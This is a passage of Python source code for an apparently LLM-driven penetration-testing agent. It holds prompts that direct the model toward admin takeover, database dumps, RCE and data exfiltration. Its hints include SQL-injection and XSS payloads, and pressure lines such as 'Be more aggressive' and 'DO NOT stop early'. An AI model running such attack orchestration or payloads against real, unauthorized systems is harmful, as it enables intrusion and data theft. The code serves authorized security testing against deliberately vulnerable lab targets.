from __future__ import annotations
import json
import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any
from vxis.agent.tool_registry import ToolRegistry, ToolResult

logger = logging.getLogger(__name__)

@dataclass
class ScanLoopState:
    target: str
    messages: list[dict[str, Any]] = field(default_factory=list)
    iteration: int = 0
    max_iters: int = 300
    completed: bool = False
    started_at: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    findings: list[dict[str, Any]] = field(default_factory=list)
    # Peak byte size of messages[] seen across the run — sampled each iteration.
    # Surfaced by ScanPipelineV2 into ctx.peak_context_bytes for the Task 14 benchmark.
    peak_context_bytes: int = 0
    # Phase C belief state: per-verdict counts from auto-verify interception
    verdict_counts: dict[str, int] = field(default_factory=lambda: {"CONFIRMED": 0, "UNCONFIRMED": 0, "REFUTED": 0})
    refuted_findings: list[dict[str, Any]] = field(default_factory=list)
    confirmed_findings: list[dict[str, Any]] = field(default_factory=list)

    def add_message(self, role: str, content: Any) -> None:
        self.messages.append({"role": role, "content": content, "iter": self.iteration})

    def update_peak_size(self) -> int:
        """Sample current messages[] byte size and update peak_context_bytes.

        Called once per iteration in ScanAgentLoop.run so the Phase A
        instrumentation metric has a meaningful non-zero value. Deterministic
        JSON-length proxy matching ScanContext.update_peak_size for consistency.
        Returns the current size.
        """
        try:
            current = len(json.dumps(self.messages, default=str, ensure_ascii=False))
        except Exception:
            current = 0
        if current > self.peak_context_bytes:
            self.peak_context_bytes = current
        return current

DIRECTOR_PROMPT_TEMPLATE = """\
You are a senior offensive security engineer driving an authorized pentest.
Goal: reach crown jewels (admin takeover, DB dump, RCE, data exfil) through
whatever attack path the evidence supports. You are the decider — not a
checklist runner, not a dispatcher of pre-built skills.

Output ONLY a JSON object — no prose, no explanation outside it:
{{"tool": "<tool_name>", "args": {{...}}}}

## Thinking pattern (Brain-First)

1. Read the evidence below — what does the DOM / fingerprint / prior responses
   actually tell you about this target? Do NOT guess from generic patterns.
2. Form ONE hypothesis about a vulnerability or next chain step grounded in
   that evidence.
3. Pick the single tool most likely to prove or refute it with minimum cost.
4. If the last action returned thin or repeated output, switch hypothesis —
   never retry the same call hoping for a different result.
5. Every confirmed finding is a stepping stone — ask "how does this extend
   the kill chain?" before picking the next action.

## Tooling surface

Primary — full freedom to compose attacks:
- `shell_exec` — Linux sandbox with sqlmap, nuclei, ffuf, nikto, gobuster,
  wapiti, curl, httpx, nmap, jq, python3 pre-installed. Use it like a real
  pentester's terminal. Pick wordlists, tune flags, pipe outputs.
- `python_exec` — multi-line Python 3 in the same sandbox (httpx/aiohttp
  pre-installed). For custom fuzzers, PoC scripts, parallel request sprays.
- `browser_*` (navigate / analyze_dom / fill_form / eval_js / click /
  get_cookies / screenshot) — SPA surface. Call `browser_analyze_dom` FIRST
  to read real form selectors + field names before `browser_fill_form`;
  never guess field names from generic patterns.
- `http_request` — one-off raw HTTP for surgical probes.

Optional helpers — pre-built batch shortcuts, not required:
- `run_skill` fires ~40 payloads at a URL in one call. Use ONLY when you want
  broad coverage of a known vector and don't need custom shaping. For novel
  or target-specific attacks, prefer `shell_exec` / `python_exec`.
- `load_playbook` retrieves saved attack patterns; inspect before firing.

Bookkeeping: `report_finding`, `query_findings`, `link_chain`, `think`,
`finish_scan`. Link chains as soon as 2+ findings compose a path — chain
intelligence drops to zero if you forget.

## Evidence-driven principles

- Authentication is the biggest multiplier. When a login surface exists, probe
  it (creds, SQLi/NoSQLi on credentials, JWT weakness, response differentials,
  password reset poisoning) before deep post-auth enumeration — unlocking auth
  cascades multiple scoring dimensions.
- Error messages, version strings, timing differences, unusual headers, and
  unexpected redirects are all evidence. Follow them.
- A tool that returns `ok=False` is pointing at a gap in your model. Re-read
  the error, adjust the hypothesis, pick a different tool. Do not spam the
  same call.
- Stay inside the sandbox for destructive-looking probes; the targets in this
  harness are intentionally vulnerable Docker containers.

TARGET: {target}
ITERATION: {iteration}/{max_iters}
FINDINGS: {finding_count}

ATTACK VECTOR STATUS:
{vector_status}

RECENT ACTIONS (last 10):
{recent_actions}

CURRENT FINDINGS:
{findings_list}

Pick ONE action grounded in the evidence above and output the JSON tool call."""


class ScanAgentLoop:
    def __init__(
        self,
        target: str,
        registry: ToolRegistry,
        max_iters: int = 300,
        brain: Any | None = None,
        critic_interval: int = 6,
        target_kind: Any = None,
    ) -> None:
        self.state = ScanLoopState(target=target, max_iters=max_iters)
        self.registry = registry
        self.brain = brain
        self.critic_interval = critic_interval
        self._last_critic_iter = 0
        # Surface kind drives skill-sweep filtering. Without it, a desktop
        # scan ends up running test_xss / test_sqli / etc. on a file:// path
        # — wasted iterations + false-positive noise from web skills hitting
        # a non-HTTP target. Kept as Any for back-compat with callers that
        # don't pass it (default = web behaviour).
        from vxis.interaction.surface import TargetKind as _TK
        self._target_kind = target_kind or _TK.WEB

    async def _decide(self, state: ScanLoopState) -> list[tuple[str, dict[str, Any]]]:
        """Returns list of (tool_name, args). Delegates to brain.think_in_loop when brain is set."""
        if self.brain is None:
            return [("finish_scan", {})]
        # Phase D scan dashboard: inject a compact progress summary into
        # every think call. This compensates for Brain's 20-message history
        # window — by iter 15, Brain has forgotten iters 1-10. The dashboard
        # gives it a complete picture in <40 lines.
        dashboard = self._build_scan_dashboard()
        messages = state.messages + [{"role": "user", "content": dashboard, "iter": state.iteration}]
        return await self.brain.think_in_loop(messages, self.registry.describe_all())

    def _build_scan_dashboard(self) -> str:
        """Build a compact scan-progress dashboard injected every iteration.

        Brain sees this every iteration instead of scrolling through 200+
        messages. Focused on: what did you find, what haven't you tested,
        what should your next GOAL be.
        """
        s = self.state

        # Collect state from messages
        tools_used: set[str] = set()
        endpoints_seen: set[str] = set()
        for m in s.messages:
            content = m.get("content", {})
            if isinstance(content, dict) and content.get("name"):
                tools_used.add(content["name"])
                args = content.get("args", {})
                if isinstance(args, dict):
                    for k in ("url", "affected_component"):
                        if args.get(k):
                            endpoints_seen.add(str(args[k])[:80])

        try:
            from vxis.agent.tools.finding_tools import _get_findings
            reported = _get_findings()
        except Exception:
            reported = []

        # Build attack vector checklist
        tested_vectors: dict[str, str] = {}  # vector → status
        finding_types = {f.get("finding_type", "") for f in reported}

        vectors = [
            ("SQLi", "sql_injection", "shell_exec" in tools_used or "sql" in str(finding_types)),
            ("XSS", "xss", "browser_eval_js" in tools_used),
            ("Auth bypass", "auth_bypass", "browser_fill_form" in tools_used),
            ("IDOR", "idor", any("idor" in str(f.get("finding_type","")).lower() for f in reported)),
            ("Sensitive files", "information_disclosure", "load_playbook" in tools_used),
            ("Dir bruteforce", "directory", any(m.get("role") == "tool" and "ffuf" in str(m.get("content", {}).get("args", "")) for m in s.messages)),
            ("CVE scan", "cve", any(m.get("role") == "tool" and "nuclei" in str(m.get("content", {}).get("args", "")) for m in s.messages)),
        ]
        for name, ftype, tested in vectors:
            found = ftype in finding_types
            if found:
                tested_vectors[name] = "✓ FOUND"
            elif tested:
                tested_vectors[name] = "tested, nothing yet"
            else:
                tested_vectors[name] = "⬚ NOT TESTED"

        # Determine current goal based on what's missing
        untested = [name for name, status in tested_vectors.items() if "NOT TESTED" in status]

        # Check existing chains
        try:
            from vxis.agent.tools.finding_tools import _get_chains
            existing_chains = _get_chains()
        except Exception:
            existing_chains = []

        lines: list[str] = [f"═══ SCAN DASHBOARD (iter {s.iteration}) ═══"]

        # Findings
        if reported:
            lines.append(f"Findings ({len(reported)}):")
            for f in reported[-5:]:
                lines.append(f"  [{f.get('severity','?').upper()}] {f['id']}: {f.get('title','?')[:60]}")
        else:
            lines.append("Findings: 0")

        # Attack vector checklist
        lines.append("Attack vectors:")
        for name, status in tested_vectors.items():
            lines.append(f"  {status} {name}")

        # Endpoints
        if endpoints_seen:
            lines.append(f"Known endpoints: {', '.join(sorted(endpoints_seen)[:8])}")

        # ── Chain Intelligence section (always on when 2+ findings) ──
        # Brain-First: Brain decides HOW to chain, we just keep the pressure
        # on every iteration. No "fire once and forget" — chain awareness must
        # persist in Brain's working context for the entire scan.
        _desired_chains = max(3, len(reported) // 3)
        if len(reported) >= 2:
            lines.append("")
            lines.append("═══ CHAIN INTELLIGENCE ═══")
            if existing_chains:
                lines.append(f"Chains recorded: {len(existing_chains)} / {_desired_chains}+ target")
                for c in existing_chains:
                    lines.append(f"  {c.get('id','?')}: {' → '.join(c.get('finding_ids',[]))} → {c.get('crown_jewel','?')[:40]}")
                if len(existing_chains) < _desired_chains:
                    lines.append(f"  ⚠ Build MORE chains — {_desired_chains - len(existing_chains)} more to reach target.")
            else:
                lines.append(f"Chains recorded: 0 / {_desired_chains}+ target  ⚠ BUILD ATTACK CHAINS NOW")

            # Broad finding-type grouping — every type lands somewhere
            # so Brain always sees chain candidates regardless of scan target.
            _cat = {
                "entry": (  # unauthenticated entry vectors
                    "sql_injection", "xss", "xss_reflected", "xss_stored", "xss_dom",
                    "ssrf", "xxe", "command_injection", "ssti", "csrf",
                    "open_redirect", "path_traversal",
                ),
                "auth": (  # authentication / session weaknesses
                    "auth_bypass", "weak_auth", "jwt_none", "jwt_confusion",
                    "session_fixation", "default_credentials", "password_reset_poisoning",
                ),
                "access": (  # authorization / access control
                    "broken_access_control", "idor", "verb_tampering",
                    "mass_assignment", "privilege_escalation", "no_rate_limit",
                ),
                "infra": (  # infra / misconfig / crypto
                    "misconfiguration", "weak_crypto", "information_disclosure",
                    "sensitive_data_exposure", "error_oracle",
                ),
                "logic": (  # business logic
                    "business_logic", "race_condition", "price_manipulation",
                    "negative_quantity", "state_bypass",
                ),
            }
            _by_cat: dict[str, list[dict[str, Any]]] = {k: [] for k in _cat}
            _uncat: list[dict[str, Any]] = []
            for f in reported:
                ft = str(f.get("finding_type", "")).lower()
                placed = False
                for cat, types in _cat.items():
                    if ft in types or any(ft.startswith(t) for t in types):
                        _by_cat[cat].append(f); placed = True; break
                if not placed:
                    _uncat.append(f)

            lines.append("Findings by category:")
            for cat, items in _by_cat.items():
                if items:
                    ids = ", ".join(f["id"] for f in items[:4])
                    lines.append(f"  {cat}: {ids}" + (f" (+{len(items)-4})" if len(items) > 4 else ""))
            if _uncat:
                lines.append(f"  other: {', '.join(f['id'] for f in _uncat[:4])}")

            # Suggest concrete chain candidates — any cross-category pair
            # with at least one finding each. Brain decides whether the chain
            # is real; we just make the candidates visible.
            _chain_candidates: list[tuple[str, list[str], str]] = []
            if _by_cat["entry"] and _by_cat["access"]:
                _chain_candidates.append((
                    "entry → access",
                    [_by_cat["entry"][0]["id"], _by_cat["access"][0]["id"]],
                    "bypass login then abuse weak authZ for data access",
                ))
            if _by_cat["auth"] and _by_cat["access"]:
                _chain_candidates.append((
                    "auth → access",
                    [_by_cat["auth"][0]["id"], _by_cat["access"][0]["id"]],
                    "compromised session then IDOR/rate-limit abuse",
                ))
            if _by_cat["infra"] and _by_cat["auth"]:
                _chain_candidates.append((
                    "infra → auth",
                    [_by_cat["infra"][0]["id"], _by_cat["auth"][0]["id"]],
                    "leaked config/keys forge tokens or reset password",
                ))
            if _by_cat["infra"] and _by_cat["access"]:
                _chain_candidates.append((
                    "infra → access",
                    [_by_cat["infra"][0]["id"], _by_cat["access"][0]["id"]],
                    "exposed config reveals admin endpoints; hit them without auth",
                ))
            if _by_cat["entry"] and _by_cat["logic"]:
                _chain_candidates.append((
                    "entry → logic",
                    [_by_cat["entry"][0]["id"], _by_cat["logic"][0]["id"]],
                    "injection-assisted logic abuse (e.g. race + price manipulation)",
                ))
            # CSRF + any auth/access = account takeover vector
            _csrf = [f for f in reported if "csrf" in str(f.get("finding_type","")).lower()]
            _rate = [f for f in reported if "rate" in str(f.get("finding_type","")).lower()]
            if _csrf and (_by_cat["auth"] or _by_cat["access"]):
                target_f = (_by_cat["auth"] or _by_cat["access"])[0]
                _chain_candidates.append((
                    "csrf → account takeover",
                    [_csrf[0]["id"], target_f["id"]],
                    "craft CSRF payload hitting authenticated state-change endpoint",
                ))
            if _rate and _by_cat["auth"]:
                _chain_candidates.append((
                    "no-rate-limit → credential brute force",
                    [_rate[0]["id"], _by_cat["auth"][0]["id"]],
                    "absence of throttling enables credential stuffing",
                ))
            # Fallback: any two findings are candidates if nothing else emerged
            if not _chain_candidates and len(reported) >= 2:
                _chain_candidates.append((
                    "any → any",
                    [reported[0]["id"], reported[-1]["id"]],
                    "explore whether these two findings compound",
                ))

            if _chain_candidates:
                lines.append("Potential chains (Brain decides which are real):")
                for label, ids, why in _chain_candidates[:5]:
                    lines.append(f"  {label}: {' → '.join(ids)} — {why}")

            lines.append("")
            lines.append("CHAIN PROTOCOL:")
            lines.append("  1. Pick 2+ findings that plausibly compose.")
            lines.append("  2. Actually TRY the chain (use tools to prove exploitability).")
            lines.append("  3. Call link_chain(finding_ids=[...], rationale=..., crown_jewel=...).")
            lines.append("  4. Repeat for every combination you can imagine.")
            lines.append("CROWN JEWELS: admin takeover, DB dump, RCE, key theft, full data exfil.")

        # Current goal — chain pressure never disappears when chains are 0
        _chain_pressure = len(reported) >= 2 and not existing_chains
        if untested and not _chain_pressure:
            goal = untested[0]
            lines.append(f"\n>> YOUR GOAL: Test {goal}.")
            if goal == "SQLi":
                lines.append("   Try: shell_exec sqlmap on an endpoint, or browser_fill_form with ' OR 1=1--")
            elif goal == "XSS":
                lines.append("   Try: browser_navigate to /search?q=<script>alert(1)</script>, then browser_eval_js")
            elif goal == "Auth bypass":
                lines.append("   Try: browser_navigate to login page, browser_fill_form with test creds")
            elif goal == "IDOR":
                lines.append("   Try: access /api/Users/2 or /api/Orders/2 with and without auth token")
            elif goal == "Dir bruteforce":
                lines.append("   Try: shell_exec ffuf with common.txt wordlist")
            elif goal == "CVE scan":
                lines.append("   Try: shell_exec nuclei with http/cves templates")
        elif _chain_pressure:
            lines.append("\n>> PRIMARY GOAL: link_chain NOW — you have findings but 0 chains.")
            lines.append("   DO NOT call finish_scan until you've tried every chain above.")
            if untested:
                lines.append(f"   Secondary: also test {untested[0]} when you run out of chain ideas.")
        elif reported:
            lines.append("\n>> Good progress. But DO NOT stop here.")
            lines.append("   The more findings you discover, the better the report.")
            lines.append("   Dig DEEPER into every endpoint. If there's even a hint of a")
            lines.append("   vulnerability, pursue it until you hit a dead end.")
            lines.append("   Use EVERYTHING you know — try edge cases, combine payloads,")
            lines.append("   fuzz parameters, test auth boundaries, escalate privileges.")
            if existing_chains and len(existing_chains) < _desired_chains:
                lines.append(f"   Build more chains — {_desired_chains} total is the floor.")
        else:
            lines.append("\n>> No findings yet. Be more aggressive.")

        lines.append("═══ Use ALL your knowledge. Every finding matters. Keep digging. ═══")
        return "\n".join(lines)

    async def _director_decide(self) -> tuple[str, dict[str, Any]] | None:
        """Strategic Director: stronger model decides the EXACT next tool call.

        Called every critic_interval iterations. Unlike the old critic (which
        gave prose advice Brain ignored), the director outputs executable JSON
        that the scan loop dispatches directly. This is the hybrid pattern:
        gpt-5.4 full for strategy, gpt-5.4-mini for routine execution.

        Returns (tool_name, args) or None if unavailable.
        """
        import asyncio
        import json as _jd
        if self.brain is None or not hasattr(self.brain, "_call_llm_with_fallback"):
            return None
        try:
            from vxis.agent.tools.finding_tools import _get_findings
            current_findings = _get_findings()
        except Exception:
            current_findings = []

        # Build recent action summary
        recent: list[str] = []
        for m in self.state.messages[-20:]:
            c = m.get("content")
            if isinstance(c, dict):
                name = c.get("name", "?")
                summary = (c.get("result") or {}).get("summary", "")[:100]
                recent.append(f"  {name}: {summary}")

        findings_summary = "\n".join(
            f"  [{f['severity']}] {f['finding_type']}: {f.get('title','')[:80]}"
            for f in current_findings[:10]
        ) or "  (none yet)"

        # Build vector status from dashboard
        vector_status = self._build_scan_dashboard()

        prompt = DIRECTOR_PROMPT_TEMPLATE.format(
            target=self.state.target,
            iteration=self.state.iteration,
            max_iters=self.state.max_iters,
            finding_count=len(current_findings),
            vector_status=vector_status,
            recent_actions="\n".join(recent[-10:]) or "  (no actions)",
            findings_list=findings_summary,
        )

        # Use gpt-5.4 full for strategic decision
        import os
        orig_model = getattr(self.brain, "_model", None)
        use_stronger = False
        if (
            getattr(self.brain, "_provider", None) == "openai"
            and os.environ.get("OPENAI_API_KEY")
            and orig_model
            and "mini" in str(orig_model)
        ):
            self.brain._model = "gpt-5.4"
            use_stronger = True

        try:
            response = await asyncio.to_thread(
                self.brain._call_llm_with_fallback,
                "Output ONLY a JSON object: {\"tool\": \"...\", \"args\": {...}}. No prose.",
                prompt,
            )
        except Exception as e:
            logger.warning("director_decide failed: %s", e)
            return None
        finally:
            if use_stronger and orig_model is not None:
                self.brain._model = orig_model

        if not response:
            return None

        # Parse the JSON tool call
        try:
            # Try to extract JSON from response
            text = response.strip()
            # Handle markdown fences
            if "```" in text:
                import re
                m = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", text, re.DOTALL)
                if m:
                    text = m.group(1)
            data = _jd.loads(text)
            tool = str(data.get("tool", ""))
            args = data.get("args", {})
            if tool and tool in self.registry.list_tools():
                logger.info("director: decided %s(%s)", tool, str(args)[:100])
                return (tool, args if isinstance(args, dict) else {})
        except Exception:
            logger.debug("director: failed to parse response: %s", response[:200])
        return None

    async def run(self) -> dict[str, Any]:
        import json as _json
        import re as _re

        self.state.add_message("system", f"Scan started on {self.state.target}")
        self.state.add_message("user", (
            f"Target: {self.state.target}\n\n"
            "You are a senior penetration tester. Find as many vulnerabilities as possible. "
            "The more you find, the better. If there's even the slightest hint of a weakness, "
            "dig into it — fuzz it, chain it, escalate it until you hit a dead end. "
            "Use ALL your knowledge: OWASP Top 10, business logic flaws, auth bypasses, "
            "injection variants, misconfigurations, everything. "
            "Then chain your findings into attack paths that reach crown jewels "
            "(admin takeover, DB dump, RCE, data exfil). "
            "DO NOT stop early. DO NOT be satisfied with surface-level findings."
        ))

        # Phase B fix: code-level anti-repetition. Track hash of (tool, args)
        # so we can detect when Brain is about to run an identical call a 3rd+
        # time and inject a synthetic "DEDUP" result instead of re-running.
        # This breaks the loop regardless of whether Brain's prompt adherence.
        _call_counts: dict[str, int] = {}

        # Phase B fix: baseline tracking + auto-finding extraction.
        # When Brain runs a probe that returns "status size path" rows, we
        # parse the output and inject a SYSTEM HINT message listing likely
        # findings. This compensates for gpt-5.4-mini's weak reason->action
        # linkage: Brain has all the data it needs but doesn't emit
        # report_finding on its own. The hint makes the conclusion explicit.
        _baseline_size: int | None = None
        _probe_row_re = _re.compile(
            r"^\s*(\d{3})\s+(\d+)\s*B?\s+[/]*([^\s]+)\s*$",
            _re.MULTILINE,
        )
        # Sticky hint: track candidates Brain still hasn't reported yet.
        # Keyed by (finding_type, affected_component) so we can check against
        # finding_tools store and drop items once Brain reports them.
        _pending_findings: dict[tuple[str, str], str] = {}
        # Track which iteration we last emitted a sticky re-injection on, so
        # multi-action iterations don't spam the same nudge N times.
        _sticky_last_iter: int = 0

        # Phase C: enterprise egress allowlist. No-op unless VXIS_EGRESS_STRICT=1.
        from vxis.agent.egress import build_allowlist, check_violations, is_strict_mode
        _egress_allowlist = build_allowlist(self.state.target)
        _egress_strict = is_strict_mode()
        if _egress_strict:
            logger.info("egress filter ENABLED — allowlist=%s", sorted(_egress_allowlist))

        _consecutive_empty = 0  # Track consecutive empty-action iterations
        # Phase C auto-orchestration flags
        _auto_browser_done = False
        _auto_nuclei_done = False
        _auto_login_done = False
        _tools_used: set[str] = set()
        # Phase E: skill auto-execution sequence
        _skill_sequence = [
            # Phase 1: Recon
            ("enumerate_endpoints", 3, {}),
            ("test_sensitive_files", 5, {}),
            ("test_infra", 6, {}),
            # Phase 2: Auth
            ("attempt_auth", 8, {}),
            # post_auth_enum + test_idor chained after auth success
            # Phase 3: Injection
            ("test_misconfig", 12, {}),
            ("test_csrf", 14, {}),
            ("test_crypto", 16, {}),
            ("test_api_security", 18, {}),
            ("test_business_logic", 20, {}),
            # test_injection + test_xss + test_ssrf chained after enumerate
            # test_auth_deep chained after auth (needs token)
        ]
        _skills_completed: set[str] = set()
        # Separate tracker: the *real* skill names that have actually been
        # dispatched (sweeps/aliases add _real_skill, not the alias). This
        # lets the sweep block at iter ≥ 25 see which registry skills were
        # never even attempted so it can force-queue them with defaults.
        _real_skills_completed: set[str] = set()
        _all_skill_names = {s[0] for s in _skill_sequence}
        _auth_token: str | None = None
        # Phase 4: track every shell_exec / python_exec invocation so the
        # scoring layer can credit VC for sandbox-based attacks. Each entry
        # is {"tool": name, "cmd"|"code": str}. Brain gets rewarded for
        # creative sandbox use instead of penalized (prior behavior).
        _sandbox_invocations: list[dict[str, str]] = []

        while not self.state.completed and self.state.iteration < self.state.max_iters:
            self.state.iteration += 1
            # LLM memory compression: when history grows beyond token
            # threshold, older messages are summarized by the LLM. Recent
            # messages preserved verbatim. Strix pattern.
            try:
                from vxis.agent.memory_compressor import compress_history
                self.state.messages = await compress_history(
                    self.state.messages, self.brain
                )
            except Exception:
                pass  # compression is best-effort
            actions = await self._decide(self.state)
            if not actions:
                _consecutive_empty += 1
                _min_iters = min(50, self.state.max_iters // 2)
                if self.state.iteration < _min_iters and _consecutive_empty <= 2:
                    self.state.add_message("user", (
                        f"SYSTEM: You returned no actions at iteration "
                        f"{self.state.iteration}. Minimum {_min_iters} required. "
                        "You MUST keep scanning. Here are concrete next actions:\n"
                        f"1. browser_navigate(url=\"{self.state.target}/#/login\") "
                        "then browser_fill_form with default creds\n"
                        f"2. shell_exec(command=\"curl -s {self.state.target}/rest/products/search?q=test\")\n"
                        "3. load_playbook(name=\"injection_vectors\") if not loaded\n"
                        f"4. python_exec with httpx to test /api/Users, /api/Challenges, /api/SecurityQuestions"
                    ))
                    logger.warning(
                        "iter %d: no actions but below min=%d (empty=%d) — nudge",
                        self.state.iteration, _min_iters, _consecutive_empty,
                    )
                    continue
                logger.warning("iter %d: no actions returned, stopping", self.state.iteration)
                break
            _consecutive_empty = 0  # Reset on successful action batch
            # Strix pattern: 1 tool call per message. Only execute the FIRST
            # action. Brain must see the result before deciding the next step.
            # This prevents "spray and pray" multi-action batches where Brain
            # fires 5 tools without reading any results.
            actions = actions[:1]
            for name, args in actions:
                # Compute a stable hash key for the (tool, args) pair
                try:
                    key = f"{name}::{_json.dumps(args, sort_keys=True, default=str)}"
                except Exception:
                    key = f"{name}::{args!r}"

                count = _call_counts.get(key, 0) + 1
                _call_counts[key] = count

                if count >= 5 and name != "finish_scan":
                    # Third or later time we're seeing this exact call. Skip the
                    # real dispatch and inject a nudge message so Brain sees
                    # different context on the next iteration.
                    _remaining_skills = sorted(_all_skill_names - _skills_completed)
                    _completed_list = sorted(_skills_completed)
                    nudge = (
                        f"BLOCKED: {name} with same args was already called "
                        f"{count - 1} times. You MUST use a DIFFERENT tool now.\n"
                        f"Skills already completed: {', '.join(_completed_list) if _completed_list else 'none'}\n"
                        f"Skills NOT yet run: {', '.join(_remaining_skills) if _remaining_skills else 'all completed'}\n"
                        f"Options:\n"
                        f"  run_skill: try one of the untested skills above\n"
                        f"  shell_exec: sqlmap, nuclei, ffuf, nmap\n"
                        f"  browser_fill_form: try login with payloads\n"
                        f"  browser_eval_js: check tokens, test XSS\n"
                        f"  python_exec: custom HTTP fuzzing script\n"
                        f"  report_finding: report what you already discovered\n"
                        f"  finish_scan: if you believe scan is complete"
                    )
                    self.state.add_message("tool", {"name": name, "args": args, "result": {
                        "ok": False,
                        "summary": nudge,
                        "data": {"dedup": True, "prior_calls": count - 1},
                    }})
                    logger.warning(
                        "iter %d: dedup-blocked repeated call: %s (count=%d)",
                        self.state.iteration, name, count,
                    )
                    continue

                # Phase C: egress filter — block shell/python/http commands
                # that reference off-allowlist hosts when strict mode is on.
                if _egress_strict and name in ("shell_exec", "python_exec", "http_request", "http_get", "http_post"):
                    blob = ""
                    if isinstance(args, dict):
                        blob = " ".join(str(v) for v in args.values() if v)
                    violations = check_violations(blob, _egress_allowlist)
                    if violations:
                        self.state.add_message("tool", {
                            "name": name, "args": args,
                            "result": {
                                "ok": False,
                                "summary": (
                                    f"EGRESS BLOCKED: command references off-allowlist host(s) "
                                    f"{violations}. Only these hosts are permitted: "
                                    f"{sorted(_egress_allowlist)}. Rewrite the command to target "
                                    f"the authorized scope only."
                                ),
                                "data": {"egress_blocked": True, "violations": violations},
                            },
                        })
                        logger.warning(
                            "iter %d: egress-blocked %s (violations=%s)",
                            self.state.iteration, name, violations,
                        )
                        continue

                # Phase C: auto-evidence-enrichment for report_finding.
                # If evidence is thin (< 200 chars) and component looks like
                # a URL, auto-fetch it and prepend the response to evidence.
                if name == "report_finding" and isinstance(args, dict):
                    evidence = str(args.get("evidence", ""))
                    component = str(args.get("affected_component", ""))
                    if len(evidence) < 200 and component.startswith("http"):
                        try:
                            from vxis.interaction.hands import SessionManager as _SessionManager
                            _mgr = _SessionManager()
                            try:
                                _sess = await _mgr.get_session(component)
                                _resp = await _sess.request("GET", component)
                                _headers = list(_resp.headers.items())[:15]
                                _enriched = (
                                    f"HTTP {_resp.status}\n"
                                    + "\n".join(f"{k}: {v}" for k, v in _headers)
                                    + f"\n\n{_resp.text[:1500]}"
                                )
                                args["evidence"] = _enriched + "\n\n--- Original evidence ---\n" + evidence
                                logger.info("auto-enriched evidence for %s (%d → %d chars)",
                                           component, len(evidence), len(args["evidence"]))
                            finally:
                                await _mgr.close_all()
                        except Exception:
                            pass  # enrichment is best-effort

                # Phase C: auto-verify HIGH/CRITICAL report_finding calls
                # before dispatch. If verify_finding is available in the
                # registry and the severity is high or critical, run the
                # adversarial check first. If REFUTED, block the report.
                if (
                    name == "report_finding"
                    and isinstance(args, dict)
                    and str(args.get("severity", "")).lower() in ("high", "critical")
                    and "verify_finding" in self.registry.list_tools()
                ):
                    try:
                        verify_args = {
                            "title": args.get("title", ""),
                            "severity": args.get("severity", ""),
                            "finding_type": args.get("finding_type", ""),
                            "affected_component": args.get("affected_component", ""),
                            "description": args.get("description", ""),
                            "evidence": args.get("evidence", ""),
                        }
                        if _baseline_size is not None:
                            verify_args["baseline_size"] = _baseline_size
                        verdict_result = await self.registry.dispatch("verify_finding", verify_args)
                        if verdict_result.ok:
                            verdict_data = verdict_result.data or {}
                            verdict = verdict_data.get("verdict", "UNCONFIRMED")
                            # Phase C belief state: track verdict counts
                            self.state.verdict_counts[verdict] = self.state.verdict_counts.get(verdict, 0) + 1
                            _belief_entry = {
                                "iter": self.state.iteration,
                                "title": args.get("title", ""),
                                "severity": args.get("severity", ""),
                                "finding_type": args.get("finding_type", ""),
                                "affected_component": args.get("affected_component", ""),
                                "confidence": verdict_data.get("confidence", "low"),
                                "reasoning": str(verdict_data.get("reasoning", ""))[:300],
                            }
                            if verdict == "CONFIRMED":
                                self.state.confirmed_findings.append(_belief_entry)
                            elif verdict == "REFUTED":
                                self.state.refuted_findings.append(_belief_entry)
                            self.state.add_message("tool", {
                                "name": "verify_finding",
                                "args": verify_args,
                                "result": {
                                    "ok": True,
                                    "summary": verdict_result.summary,
                                    "data": verdict_data,
                                },
                            })
                            logger.info(
                                "iter %d: auto-verify for %s severity=%s → %s",
                                self.state.iteration,
                                args.get("affected_component", "?"),
                                args.get("severity", "?"),
                                verdict,
                            )
                            if verdict == "REFUTED":
                                # Block the report_finding dispatch — treat
                                # as a soft fail so Brain sees the refutation
                                # reasoning on next iteration.
                                self.state.add_message("tool", {
                                    "name": "report_finding",
                                    "args": args,
                                    "result": {
                                        "ok": False,
                                        "summary": (
                                            "report_finding BLOCKED by auto-verifier "
                                            "(REFUTED). Reason: "
                                            + str(verdict_data.get("reasoning", ""))[:300]
                                        ),
                                        "data": {"verifier_blocked": True, "verdict": verdict},
                                    },
                                })
                                logger.warning(
                                    "iter %d: report_finding BLOCKED (REFUTED) for %s",
                                    self.state.iteration,
                                    args.get("affected_component", "?"),
                                )
                                continue
                    except Exception:
                        logger.exception("auto-verify failed — proceeding with report_finding")

                result = await self.registry.dispatch(name, args)
                self.state.add_message("tool", {"name": name, "args": args, "result": {
                    "ok": result.ok, "summary": result.summary, "data": result.data,
                }})

                # Phase 4: record sandbox invocations for VC scoring.
                # Every shell_exec / python_exec call — whether ok or not —
                # counts as an attempt so that VC reflects Brain's explored
                # surface, not only successful runs.
                if name in ("shell_exec", "python_exec"):
                    _inv: dict[str, str] = {"tool": name}
                    _cmd_val = args.get("command") or args.get("cmd") or ""
                    _code_val = args.get("code") or ""
                    if _cmd_val:
                        _inv["cmd"] = str(_cmd_val)
                    if _code_val:
                        _inv["code"] = str(_code_val)
                    if _inv.get("cmd") or _inv.get("code"):
                        _sandbox_invocations.append(_inv)

                # Phase B: auto-extract findings from probe output. If the tool
                # output looks like a path-size-status probe result, parse it,
                # diff against baseline, and inject a SYSTEM HINT nudging Brain
                # to call report_finding on the real finds.
                if name in ("python_exec", "shell_exec") and result.ok:
                    stdout = ""
                    if isinstance(result.data, dict):
                        stdout = str(result.data.get("stdout", ""))
                    rows = _probe_row_re.findall(stdout)
                    if rows and len(rows) >= 3:
                        # Update baseline if we see the SPA shell size showing up repeatedly
                        sizes = [int(s) for _, s, _ in rows]
                        if _baseline_size is None:
                            # Assume the most common size is the SPA shell
                            from collections import Counter
                            common = Counter(sizes).most_common(1)
                            if common and common[0][1] >= 3:
                                _baseline_size = common[0][0]

                        findings_hint: list[str] = []
                        seen: set[tuple[str, str]] = set()

                        # First pass: collect per-base-path sizes for query-param
                        # diff detection (SQL injection / XSS / IDOR via response-
                        # length oracle)
                        path_sizes: dict[str, list[tuple[str, int, str]]] = {}
                        for code, size_s, path in rows:
                            base = path.split("?", 1)[0].rstrip("/")
                            path_sizes.setdefault(base, []).append((code, int(size_s), path))

                        # Second pass: per-row heuristics
                        for code, size_s, path in rows:
                            size = int(size_s)
                            key = (code, path)
                            if key in seen:
                                continue
                            seen.add(key)
                            code_i = int(code)
                            norm_path = "/" + path.lstrip("/")
                            base_key = path.split("?", 1)[0].rstrip("/")
